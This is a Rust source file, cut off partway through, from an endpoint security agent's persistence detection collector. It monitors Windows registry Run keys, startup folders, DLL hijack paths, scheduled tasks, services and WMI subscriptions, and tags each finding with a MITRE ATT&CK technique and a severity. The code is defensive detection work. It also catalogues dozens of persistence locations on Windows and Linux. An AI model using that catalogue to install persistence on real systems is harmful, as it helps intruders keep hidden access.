//! Persistence Detection Collector
//!
//! Comprehensive real-time monitoring of persistence mechanisms across Windows and Linux.
//! Uses platform-specific APIs for efficient change detection:
//! - Windows: RegNotifyChangeKeyValue, directory change notifications
//! - Linux: inotify for file monitoring
//!
//! Detects installation of persistence through various techniques including:
//!
//! Windows:
//! - Registry Run/RunOnce keys (T1547.001)
//! - Scheduled Tasks via schtasks.exe and Task Scheduler API (T1053.005)
//! - Services via sc.exe and SCM (T1543.003)
//! - WMI Event Subscriptions (T1546.003)
//! - Startup folders (T1547.001)
//! - AppInit_DLLs (T1546.010)
//! - Image File Execution Options (T1546.012)
//! - Winlogon (T1547.004)
//! - LSA packages (T1547.002)
//! - Print Monitors (T1547.010)
//! - Security Support Providers (T1547.005)
//! - Boot Execute (T1547.012)
//! - COM Object Hijacking (T1546.015)
//! - Browser Helper Objects (T1176)
//! - Office Add-ins (T1137)
//! - DLL Search Order Hijacking locations (T1574.001)
//! - Path Interception (T1574.007, T1574.008)
//!
//! Linux:
//! - Crontab files (T1053.003)
//! - Systemd services/timers (T1543.002)
//! - Init.d scripts (T1037.004)
//! - rc.local (T1037.004)
//! - Shell profile modifications (T1546.004)
//! - LD_PRELOAD environment (T1574.006)
//! - /etc/ld.so.preload (T1574.006)
//! - PAM modules (T1556.003)
//! - SSH authorized_keys (T1098.004)
//! - At jobs (T1053.001)
//! - udev rules (T1037.004)
//! - Kernel modules (T1547.006)

// This collector enumerates persistence-mechanism tables across Windows
// (registry Run keys, scheduled tasks, services, WMI subscriptions, AppInit,
// IFEO, Winlogon, LSA, print monitors) and Linux (systemd, cron, profile,
// udev, kmod). Reserved fields and helper utilities are kept exhaustive even
// when not all paths are dispatched yet.
#![allow(dead_code, unused_variables)]

use super::{Detection, DetectionType, EventPayload, EventType, Severity, TelemetryEvent};
use crate::config::AgentConfig;
use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::mpsc;
use tracing::{debug, error, info, trace, warn};

/// Persistence event data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceEvent {
    /// Type of persistence mechanism
    pub persistence_type: PersistenceType,
    /// Path to the persistence location (registry key, file path, etc.)
    pub location: String,
    /// Name of the persistence entry
    pub name: String,
    /// Value or content of the persistence entry
    pub value: String,
    /// Operation (create, modify, delete)
    pub operation: String,
    /// Process that created/modified the persistence
    pub pid: u32,
    /// Process name
    pub process_name: String,
    /// Process path
    pub process_path: String,
    /// Process command line
    pub process_cmdline: String,
    /// MITRE ATT&CK technique ID
    pub mitre_technique: String,
    /// MITRE ATT&CK tactic
    pub mitre_tactic: String,
    /// User who made the change
    pub username: String,
    /// SHA256 hash of the persistence payload (if file-based)
    #[serde(default)]
    pub payload_hash: Option<String>,
    /// Additional metadata
    #[serde(default)]
    pub metadata: HashMap<String, String>,
}

/// Types of persistence mechanisms
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
#[serde(rename_all = "snake_case")]
pub enum PersistenceType {
    // Windows persistence types
    RegistryRunKey,
    RegistryRunOnceKey,
    ScheduledTask,
    WindowsService,
    WmiSubscription,
    StartupFolder,
    AppInitDll,
    ImageFileExecutionOptions,
    Winlogon,
    LsaPackage,
    PrintMonitor,
    SecuritySupportProvider,
    BootExecute,
    SessionManager,
    ComHijacking,
    BrowserHelperObject,
    OfficeAddin,
    AppCertDll,
    DllSearchOrderHijack,
    PathInterception,
    Netsh,
    ScreenSaver,
    ActiveSetup,
    TerminalServicesInitialProgram,
    // Linux persistence types
    Crontab,
    SystemdService,
    SystemdTimer,
    InitScript,
    RcLocal,
    ShellProfile,
    LdPreload,
    LdSoPreload,
    LdSoConf,
    PamModule,
    SshAuthorizedKey,
    AtJob,
    XdgAutostart,
    UdevRule,
    KernelModule,
    MotdScript,
    Anacron,
    // Generic
    Other,
}

impl PersistenceType {
    /// Get the MITRE ATT&CK technique ID for this persistence type
    pub fn mitre_technique(&self) -> &'static str {
        match self {
            Self::RegistryRunKey
            | Self::RegistryRunOnceKey
            | Self::StartupFolder
            | Self::XdgAutostart => "T1547.001",
            Self::ScheduledTask => "T1053.005",
            Self::WindowsService => "T1543.003",
            Self::WmiSubscription => "T1546.003",
            Self::AppInitDll | Self::AppCertDll => "T1546.010",
            Self::ImageFileExecutionOptions => "T1546.012",
            Self::Winlogon => "T1547.004",
            Self::LsaPackage => "T1547.002",
            Self::PrintMonitor => "T1547.010",
            Self::SecuritySupportProvider => "T1547.005",
            Self::BootExecute | Self::SessionManager => "T1547.012",
            Self::ComHijacking => "T1546.015",
            Self::BrowserHelperObject => "T1176",
            Self::OfficeAddin => "T1137",
            Self::DllSearchOrderHijack => "T1574.001",
            Self::PathInterception => "T1574.007",
            Self::Netsh => "T1546.007",
            Self::ScreenSaver => "T1546.002",
            Self::ActiveSetup => "T1547.014",
            Self::TerminalServicesInitialProgram => "T1547.001",
            Self::Crontab | Self::Anacron => "T1053.003",
            Self::SystemdService | Self::SystemdTimer => "T1543.002",
            Self::InitScript | Self::RcLocal | Self::MotdScript | Self::UdevRule => "T1037.004",
            Self::ShellProfile => "T1546.004",
            Self::LdPreload | Self::LdSoPreload | Self::LdSoConf => "T1574.006",
            Self::PamModule => "T1556.003",
            Self::SshAuthorizedKey => "T1098.004",
            Self::AtJob => "T1053.001",
            Self::KernelModule => "T1547.006",
            Self::Other => "T1547",
        }
    }

    /// Get the MITRE ATT&CK tactic for this persistence type
    pub fn mitre_tactic(&self) -> &'static str {
        match self {
            Self::LsaPackage | Self::PamModule => {
                "Persistence, Privilege Escalation, Defense Evasion"
            }
            Self::SshAuthorizedKey => "Persistence, Lateral Movement",
            Self::LdPreload
            | Self::LdSoPreload
            | Self::LdSoConf
            | Self::DllSearchOrderHijack
            | Self::PathInterception => "Persistence, Privilege Escalation, Defense Evasion",
            Self::KernelModule => "Persistence, Privilege Escalation",
            _ => "Persistence",
        }
    }

    /// Get a human-readable description
    pub fn description(&self) -> &'static str {
        match self {
            Self::RegistryRunKey => "Registry Run Key",
            Self::RegistryRunOnceKey => "Registry RunOnce Key",
            Self::ScheduledTask => "Scheduled Task",
            Self::WindowsService => "Windows Service",
            Self::WmiSubscription => "WMI Event Subscription",
            Self::StartupFolder => "Startup Folder",
            Self::AppInitDll => "AppInit_DLLs",
            Self::ImageFileExecutionOptions => "Image File Execution Options",
            Self::Winlogon => "Winlogon Helper",
            Self::LsaPackage => "LSA Authentication Package",
            Self::PrintMonitor => "Print Monitor",
            Self::SecuritySupportProvider => "Security Support Provider",
            Self::BootExecute => "Boot Execute",
            Self::SessionManager => "Session Manager",
            Self::ComHijacking => "COM Object Hijacking",
            Self::BrowserHelperObject => "Browser Helper Object",
            Self::OfficeAddin => "Office Add-in",
            Self::AppCertDll => "AppCertDLLs",
            Self::DllSearchOrderHijack => "DLL Search Order Hijacking",
            Self::PathInterception => "Path Interception",
            Self::Netsh => "Netsh Helper DLL",
            Self::ScreenSaver => "Screensaver",
            Self::ActiveSetup => "Active Setup",
            Self::TerminalServicesInitialProgram => "Terminal Services Initial Program",
            Self::Crontab => "Crontab Entry",
            Self::SystemdService => "Systemd Service",
            Self::SystemdTimer => "Systemd Timer",
            Self::InitScript => "Init Script",
            Self::RcLocal => "rc.local Script",
            Self::ShellProfile => "Shell Profile Modification",
            Self::LdPreload => "LD_PRELOAD Hijacking",
            Self::LdSoPreload => "ld.so.preload Hijacking",
            Self::LdSoConf => "ld.so.conf Modification",
            Self::PamModule => "PAM Module",
            Self::SshAuthorizedKey => "SSH Authorized Key",
            Self::AtJob => "At Job",
            Self::XdgAutostart => "XDG Autostart Entry",
            Self::UdevRule => "Udev Rule",
            Self::KernelModule => "Kernel Module",
            Self::MotdScript => "MOTD Script",
            Self::Anacron => "Anacron Job",
            Self::Other => "Unknown Persistence Mechanism",
        }
    }

    /// Get severity for this persistence type
    pub fn severity(&self) -> Severity {
        match self {
            // Critical: High-privilege persistence mechanisms
            Self::LsaPackage
            | Self::SecuritySupportProvider
            | Self::BootExecute
            | Self::SessionManager
            | Self::PamModule
            | Self::LdSoPreload
            | Self::KernelModule
            | Self::ImageFileExecutionOptions => Severity::Critical,

            // High: Commonly abused by malware, harder to detect
            Self::WmiSubscription
            | Self::Winlogon
            | Self::AppInitDll
            | Self::AppCertDll
            | Self::LdPreload
            | Self::LdSoConf
            | Self::DllSearchOrderHijack
            | Self::PrintMonitor
            | Self::ComHijacking
            | Self::UdevRule => Severity::High,

            // Medium: Standard persistence, commonly legitimate but also abused
            Self::RegistryRunKey
            | Self::RegistryRunOnceKey
            | Self::ScheduledTask
            | Self::WindowsService
            | Self::SystemdService
            | Self::Crontab
            | Self::SshAuthorizedKey
            | Self::ShellProfile
            | Self::StartupFolder => Severity::Medium,

            // Low: Less commonly abused or easily visible
            _ => Severity::Low,
        }
    }
}

/// Persistence collector for monitoring persistence mechanisms
pub struct PersistenceCollector {
    config: AgentConfig,
    event_rx: mpsc::Receiver<TelemetryEvent>,
}

impl PersistenceCollector {
    /// Create a new persistence collector
    pub fn new(config: &AgentConfig) -> Self {
        let (tx, rx) = mpsc::channel(1000);

        // Start monitoring in background
        let config_clone = config.clone();
        std::thread::spawn(move || {
            let rt = match tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt,
                Err(e) => {
                    error!(error = %e, "Failed to create tokio runtime for persistence monitor");
                    return;
                }
            };

            rt.block_on(async {
                if let Err(e) = Self::monitor_persistence(tx, config_clone).await {
                    error!(error = %e, "Persistence collector error");
                }
            });
        });

        Self {
            config: config.clone(),
            event_rx: rx,
        }
    }

    /// Main monitoring loop
    async fn monitor_persistence(
        tx: mpsc::Sender<TelemetryEvent>,
        config: AgentConfig,
    ) -> Result<()> {
        info!("Persistence collector started");

        // Initial baseline scan
        let known_entries = Arc::new(tokio::sync::RwLock::new(HashMap::new()));
        Self::baseline_scan(&known_entries).await;

        let entries_count = known_entries.read().await.len();
        info!(
            entries = entries_count,
            "Baseline persistence scan complete"
        );

        // Platform-specific real-time monitoring
        #[cfg(target_os = "windows")]
        {
            Self::start_windows_monitors(tx, known_entries, config).await;
        }

        #[cfg(target_os = "linux")]
        {
            Self::start_linux_monitors(tx, known_entries, config).await;
        }

        #[cfg(target_os = "macos")]
        {
            Self::start_macos_monitors(tx, known_entries, config).await;
        }

        // Keep the task alive
        loop {
            tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
        }
    }

    /// Perform baseline scan of persistence locations
    async fn baseline_scan(known_entries: &Arc<tokio::sync::RwLock<HashMap<String, String>>>) {
        #[cfg(target_os = "windows")]
        {
            Self::baseline_windows(known_entries).await;
        }

        #[cfg(target_os = "linux")]
        {
            Self::baseline_linux(known_entries).await;
        }

        #[cfg(target_os = "macos")]
        {
            Self::baseline_macos(known_entries).await;
        }
    }

    /// Get next event from collector
    pub async fn next_event(&mut self) -> Option<TelemetryEvent> {
        self.event_rx.recv().await
    }

    // ========================================================================
    // Windows Implementation
    // ========================================================================

    #[cfg(target_os = "windows")]
    async fn baseline_windows(known_entries: &Arc<tokio::sync::RwLock<HashMap<String, String>>>) {
        let mut entries = known_entries.write().await;

        // Registry locations to baseline
        let registry_locations = Self::get_windows_registry_locations();
        for (root, subkey, _ptype) in &registry_locations {
            if let Ok(values) = Self::read_registry_values_winreg(*root, subkey) {
                for (name, value) in values {
                    let key = format!("{:?}\\{}\\{}", root, subkey, name);
                    entries.insert(key, value);
                }
            }
        }

        // Startup folders
        for folder in Self::get_startup_folders() {
            if let Ok(dir_entries) = std::fs::read_dir(&folder) {
                for entry in dir_entries.flatten() {
                    let path = entry.path();
                    if let Ok(metadata) = std::fs::metadata(&path) {
                        let key = path.to_string_lossy().to_string();
                        let value = format!(
                            "size:{}:mtime:{}",
                            metadata.len(),
                            metadata
                                .modified()
                                .map(|t| t
                                    .duration_since(std::time::UNIX_EPOCH)
                                    .unwrap_or_default()
                                    .as_secs())
                                .unwrap_or(0)
                        );
                        entries.insert(key, value);
                    }
                }
            }
        }

        // DLL hijacking locations
        for path in Self::get_dll_hijack_locations() {
            if let Ok(metadata) = std::fs::metadata(&path) {
                let value = format!("size:{}", metadata.len());
                entries.insert(path.to_string_lossy().to_string(), value);
            }
        }

        // Scheduled tasks
        if let Ok(tasks) = Self::enumerate_scheduled_tasks().await {
            for (name, command) in tasks {
                let key = format!("ScheduledTask\\{}", name);
                entries.insert(key, command);
            }
        }

        // Services
        if let Ok(services) = Self::enumerate_services().await {
            for (name, path) in services {
                let key = format!("Service\\{}", name);
                entries.insert(key, path);
            }
        }

        // WMI subscriptions
        if let Ok(subs) = Self::enumerate_wmi_subscriptions().await {
            for (name, consumer) in subs {
                let key = format!("WMI\\{}", name);
                entries.insert(key, consumer);
            }
        }

        debug!(count = entries.len(), "Windows baseline scan complete");
    }

    #[cfg(target_os = "windows")]
    async fn start_windows_monitors(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
        config: AgentConfig,
    ) {
        // Start registry monitors using RegNotifyChangeKeyValue
        let registry_locations = Self::get_windows_registry_locations();

        for (root, subkey, ptype) in registry_locations {
            let tx_clone = tx.clone();
            let known_entries_clone = known_entries.clone();
            let subkey_owned = subkey.to_string();
            let ptype_owned = ptype;

            tokio::spawn(async move {
                Self::monitor_registry_key(
                    tx_clone,
                    known_entries_clone,
                    root,
                    &subkey_owned,
                    ptype_owned,
                )
                .await;
            });
        }

        // Start startup folder monitors
        for folder in Self::get_startup_folders() {
            let tx_clone = tx.clone();
            let known_entries_clone = known_entries.clone();

            tokio::spawn(async move {
                Self::monitor_startup_folder(tx_clone, known_entries_clone, folder).await;
            });
        }

        // Start DLL hijacking location monitors
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        tokio::spawn(async move {
            Self::monitor_dll_hijack_locations(tx_clone, known_entries_clone).await;
        });

        // Start periodic scheduled task monitor
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        tokio::spawn(async move {
            Self::monitor_scheduled_tasks_periodic(tx_clone, known_entries_clone).await;
        });

        // Start periodic service monitor
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        tokio::spawn(async move {
            Self::monitor_services_periodic(tx_clone, known_entries_clone).await;
        });

        // Start periodic WMI subscription monitor
        let tx_clone = tx.clone();
        let known_entries_clone = known_entries.clone();
        tokio::spawn(async move {
            Self::monitor_wmi_periodic(tx_clone, known_entries_clone).await;
        });

        info!("Windows persistence monitors started");
    }

    #[cfg(target_os = "windows")]
    fn get_windows_registry_locations() -> Vec<(winreg::HKEY, &'static str, PersistenceType)> {
        use winreg::enums::*;

        vec![
            // Run keys - T1547.001
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                PersistenceType::RegistryRunKey,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                PersistenceType::RegistryRunOnceKey,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx",
                PersistenceType::RegistryRunOnceKey,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                PersistenceType::RegistryRunKey,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                PersistenceType::RegistryRunOnceKey,
            ),
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                PersistenceType::RegistryRunKey,
            ),
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                PersistenceType::RegistryRunOnceKey,
            ),
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
                PersistenceType::RegistryRunKey,
            ),
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
                PersistenceType::RegistryRunOnceKey,
            ),
            // Policies Run keys
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
                PersistenceType::RegistryRunKey,
            ),
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
                PersistenceType::RegistryRunKey,
            ),
            // Winlogon - T1547.004
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                PersistenceType::Winlogon,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon",
                PersistenceType::Winlogon,
            ),
            // AppInit_DLLs - T1546.010
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                PersistenceType::AppInitDll,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows",
                PersistenceType::AppInitDll,
            ),
            // Image File Execution Options - T1546.012
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
                PersistenceType::ImageFileExecutionOptions,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
                PersistenceType::ImageFileExecutionOptions,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit",
                PersistenceType::ImageFileExecutionOptions,
            ),
            // LSA - T1547.002
            (
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Lsa",
                PersistenceType::LsaPackage,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Lsa\OSConfig",
                PersistenceType::LsaPackage,
            ),
            // Print Monitors - T1547.010
            (
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Print\Monitors",
                PersistenceType::PrintMonitor,
            ),
            // Security Support Providers - T1547.005
            (
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\SecurityProviders",
                PersistenceType::SecuritySupportProvider,
            ),
            // Boot Execute - T1547.012
            (
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Session Manager",
                PersistenceType::SessionManager,
            ),
            // AppCertDLLs - T1546.010
            (
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls",
                PersistenceType::AppCertDll,
            ),
            // COM Hijacking - T1546.015
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Classes\CLSID",
                PersistenceType::ComHijacking,
            ),
            // Browser Helper Objects - T1176
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects",
                PersistenceType::BrowserHelperObject,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects",
                PersistenceType::BrowserHelperObject,
            ),
            // Office Add-ins - T1137
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Office\Word\Addins",
                PersistenceType::OfficeAddin,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Office\Excel\Addins",
                PersistenceType::OfficeAddin,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Office\PowerPoint\Addins",
                PersistenceType::OfficeAddin,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Office\Outlook\Addins",
                PersistenceType::OfficeAddin,
            ),
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Office\Word\Addins",
                PersistenceType::OfficeAddin,
            ),
            (
                HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Office\Excel\Addins",
                PersistenceType::OfficeAddin,
            ),
            // Netsh Helper DLLs - T1546.007
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Netsh",
                PersistenceType::Netsh,
            ),
            // Screensaver - T1546.002
            (
                HKEY_CURRENT_USER,
                r"Control Panel\Desktop",
                PersistenceType::ScreenSaver,
            ),
            // Active Setup - T1547.014
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Active Setup\Installed Components",
                PersistenceType::ActiveSetup,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components",
                PersistenceType::ActiveSetup,
            ),
            // Terminal Services Initial Program
            (
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services",
                PersistenceType::TerminalServicesInitialProgram,
            ),
            (
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
                PersistenceType::TerminalServicesInitialProgram,
            ),
        ]
    }

    #[cfg(target_os = "windows")]
    fn read_registry_values_winreg(
        root: winreg::HKEY,
        subkey: &str,
    ) -> Result<Vec<(String, String)>> {
        use winreg::RegKey;

        let mut results = Vec::new();
        let hkey = RegKey::predef(root);

        if let Ok(key) = hkey.open_subkey(subkey) {
            for value_result in key.enum_values() {
                if let Ok((name, value)) = value_result {
                    let value_str = format!("{:?}", value);
                    results.push((name, value_str));
                }
            }
        }

        Ok(results)
    }

    #[cfg(target_os = "windows")]
    fn get_startup_folders() -> Vec<PathBuf> {
        let mut folders = Vec::new();

        // System startup folder
        if let Ok(programdata) = std::env::var("ProgramData") {
            folders.push(PathBuf::from(format!(
                "{}\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp",
                programdata
            )));
        }

        // User startup folders
        if let Ok(userprofile) = std::env::var("USERPROFILE") {
            folders.push(PathBuf::from(format!(
                "{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                userprofile
            )));
        }

        // All users startup
        folders.push(PathBuf::from(
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp",
        ));

        folders
    }

    #[cfg(target_os = "windows")]
    fn get_dll_hijack_locations() -> Vec<PathBuf> {
        let mut locations = Vec::new();

        // System32 and SysWOW64 are common hijacking targets
        // We look for DLLs that might be planted in locations searched before system directories

        // Current directory hijacking (if an app loads a DLL from current dir)
        if let Ok(current_dir) = std::env::current_dir() {
            locations.push(current_dir);
        }

        // PATH directories - look for suspicious DLLs
        if let Ok(path) = std::env::var("PATH") {
            for dir in path.split(';') {
                if !dir.is_empty() {
                    let path = PathBuf::from(dir);
                    // Skip system directories
                    if !dir.to_lowercase().contains("windows\\system32")
                        && !dir.to_lowercase().contains("windows\\syswow64")
                    {
                        locations.push(path);
                    }
                }
            }
        }

        // Known DLL directories that can be hijacked
        if let Ok(windir) = std::env::var("WINDIR") {
            // KnownDLLs directory - modifications here are suspicious
            locations.push(PathBuf::from(format!("{}\\System32\\wbem", windir)));
        }

        locations
    }

    #[cfg(target_os = "windows")]
    async fn monitor_registry_key(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
        root: winreg::HKEY,
        subkey: &str,
        ptype: PersistenceType,
    ) {
        use std::time::Duration;
        use winreg::RegKey;

        let hkey = RegKey::predef(root);

        loop {
            // Open key for monitoring
            let key = match hkey
                .open_subkey_with_flags(subkey, winreg::enums::KEY_NOTIFY | winreg::enums::KEY_READ)
            {
                Ok(k) => k,
                Err(e) => {
                    trace!(key = %subkey, error = %e, "Cannot open registry key for monitoring");
                    tokio::time::sleep(Duration::from_secs(60)).await;
                    continue;
                }
            };

            // Wait for changes using RegNotifyChangeKeyValue
            // We need to use the Windows API directly here
            #[cfg(target_os = "windows")]
            {
                use windows::Win32::Foundation::*;
                use windows::Win32::System::Registry::*;

                unsafe {
                    // Get the raw handle from winreg
                    let handle = HKEY(key.raw_handle() as isize);

                    let result = RegNotifyChangeKeyValue(
                        handle,
                        true,
                        REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_LAST_SET,
                        HANDLE::default(),
                        false,
                    );

                    if result.is_ok() {
                        // Change detected - scan for differences
                        let full_key = format!("{:?}\\{}", root, subkey);
                        info!(key = %full_key, "Registry change detected");

                        Self::process_registry_change(
                            &tx,
                            &known_entries,
                            root,
                            subkey,
                            ptype.clone(),
                        )
                        .await;
                    } else {
                        warn!(key = %subkey, "RegNotifyChangeKeyValue failed");
                        tokio::time::sleep(Duration::from_secs(30)).await;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn process_registry_change(
        tx: &mpsc::Sender<TelemetryEvent>,
        known_entries: &Arc<tokio::sync::RwLock<HashMap<String, String>>>,
        root: winreg::HKEY,
        subkey: &str,
        ptype: PersistenceType,
    ) {
        if let Ok(current_values) = Self::read_registry_values_winreg(root, subkey) {
            let mut entries = known_entries.write().await;

            for (name, value) in current_values {
                let key = format!("{:?}\\{}\\{}", root, subkey, name);
                let is_new = !entries.contains_key(&key);
                let is_modified = entries.get(&key).map(|v| v != &value).unwrap_or(false);

                if is_new || is_modified {
                    let operation = if is_new { "create" } else { "modify" };

                    // Get process info that might have made the change
                    let (pid, process_name, process_path, cmdline, username) =
                        Self::get_recent_modifying_process().await;

                    if let Some(event) = Self::create_persistence_event(
                        ptype.clone(),
                        &format!("{:?}\\{}", root, subkey),
                        &name,
                        &value,
                        operation,
                        pid,
                        &process_name,
                        &process_path,
                        &cmdline,
                        &username,
                    ) {
                        let _ = tx.send(event).await;
                    }

                    entries.insert(key, value);
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_startup_folder(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
        folder: PathBuf,
    ) {
        use notify::{Event, RecursiveMode, Watcher};

        let (notify_tx, mut notify_rx) = tokio::sync::mpsc::channel(100);

        let mut watcher = match notify::recommended_watcher(move |res: notify::Result<Event>| {
            if let Ok(event) = res {
                let _ = notify_tx.blocking_send(event);
            }
        }) {
            Ok(w) => w,
            Err(e) => {
                warn!(folder = %folder.display(), error = %e, "Failed to create file watcher");
                return;
            }
        };

        if let Err(e) = watcher.watch(&folder, RecursiveMode::NonRecursive) {
            warn!(folder = %folder.display(), error = %e, "Failed to watch startup folder");
            return;
        }

        info!(folder = %folder.display(), "Monitoring startup folder");

        while let Some(event) = notify_rx.recv().await {
            for path in &event.paths {
                let path_str = path.to_string_lossy().to_string();
                let operation = match event.kind {
                    notify::EventKind::Create(_) => "create",
                    notify::EventKind::Modify(_) => "modify",
                    notify::EventKind::Remove(_) => "delete",
                    _ => continue,
                };

                let (pid, process_name, process_path, cmdline, username) =
                    Self::get_recent_modifying_process().await;

                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();

                // Calculate hash if file exists
                let payload_hash = if path.exists() {
                    Self::calculate_file_hash(&path_str).await.ok()
                } else {
                    None
                };

                if let Some(event) = Self::create_persistence_event_with_hash(
                    PersistenceType::StartupFolder,
                    &folder.to_string_lossy(),
                    &name,
                    &path_str,
                    operation,
                    pid,
                    &process_name,
                    &process_path,
                    &cmdline,
                    &username,
                    payload_hash,
                ) {
                    let _ = tx.send(event).await;
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_dll_hijack_locations(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
    ) {
        use std::time::Duration;

        let mut interval = tokio::time::interval(Duration::from_secs(60));

        loop {
            interval.tick().await;

            for location in Self::get_dll_hijack_locations() {
                if !location.exists() {
                    continue;
                }

                if let Ok(entries) = std::fs::read_dir(&location) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        let extension = path
                            .extension()
                            .map(|e| e.to_string_lossy().to_lowercase())
                            .unwrap_or_default();

                        // Only look at DLLs and executables
                        if extension != "dll" && extension != "exe" {
                            continue;
                        }

                        let path_str = path.to_string_lossy().to_string();
                        let key = path_str.clone();

                        if let Ok(metadata) = std::fs::metadata(&path) {
                            let value = format!("size:{}", metadata.len());
                            let mut entries = known_entries.write().await;

                            let is_new = !entries.contains_key(&key);
                            let is_modified =
                                entries.get(&key).map(|v| v != &value).unwrap_or(false);

                            if is_new {
                                let (pid, process_name, process_path, cmdline, username) =
                                    Self::get_recent_modifying_process().await;

                                let name = path
                                    .file_name()
                                    .map(|n| n.to_string_lossy().to_string())
                                    .unwrap_or_default();

                                let payload_hash = Self::calculate_file_hash(&path_str).await.ok();

                                if let Some(event) = Self::create_persistence_event_with_hash(
                                    PersistenceType::DllSearchOrderHijack,
                                    &location.to_string_lossy(),
                                    &name,
                                    &path_str,
                                    "create",
                                    pid,
                                    &process_name,
                                    &process_path,
                                    &cmdline,
                                    &username,
                                    payload_hash,
                                ) {
                                    let _ = tx.send(event).await;
                                }

                                entries.insert(key, value);
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn enumerate_scheduled_tasks() -> Result<Vec<(String, String)>> {
        use std::process::Command;

        let output = Command::new("schtasks")
            .args(["/Query", "/FO", "CSV", "/V"])
            .output()?;

        let mut tasks = Vec::new();
        let stdout = String::from_utf8_lossy(&output.stdout);

